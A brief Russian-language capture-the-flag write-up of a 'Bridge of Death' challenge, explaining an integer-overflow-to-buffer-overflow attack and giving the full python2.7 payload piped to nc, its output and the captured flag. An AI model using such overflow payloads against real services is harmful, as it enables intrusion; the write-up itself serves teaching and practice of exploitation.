Используем ошибку с integer overflow для указания более длинного значения, переполняем буфер, прыгаем на функцию распечатывания флага:
```
python2.7 -c "print('N\n'+'Q\n'+'65536\n'+('A'*(1024+56))+chr(0xb5)+chr(0x18)+chr(0x40)+'\n')" | nc <IP> 1234
Stop. Who would cross the Bridge of Death must answer me these questions three, ere the other side he see.
What... is your name?
N, what... is your quest?
What... is the air-speed velocity of an unladen swallow?
Please, enter length of your answer:
Now, speak!
Auuuuuuuugh!
nto{y0u_kn0w_s0_much_4b0ut_pwn}
Go on. Off you go.
```
